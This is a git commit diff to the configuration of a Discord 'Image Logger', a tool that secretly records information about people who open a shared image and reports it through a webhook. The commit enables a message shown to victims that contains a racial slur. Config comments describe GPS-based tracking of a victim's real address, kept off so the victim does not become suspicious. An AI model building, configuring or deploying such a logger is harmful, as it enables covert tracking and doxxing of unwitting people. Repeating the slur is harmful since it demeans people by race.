9669593caf61f94013eb4e28d87df3a4baacb660
DingDongEatItUpEatItWellAndMixItUp <buffalopat56@gmail.com>
2025-07-31 19:36:06 -0400

    Update main.py

--- api/main.py
+++ api/main.py
@@ -18,7 +18,7 @@ config = {
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
-    "username": "Image Logger", # Set this to the name you want the webhook to have
+    "username": "...", # Set this to the name you want the webhook to have
     "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
@@ -27,8 +27,8 @@ config = {
     "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
     "message": { # Show a custom message when the user opens the image
-        "doMessage": False, # Enable the custom message?
-        "message": "This browser has been pwned by Dexty's Image Logger. https://github.com/xdexty0/Discord-Image-Logger", # Message to show
+        "doMessage": True, # Enable the custom message?
+        "message": "get fucked by unthrivingfaces image logger bum nigga", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
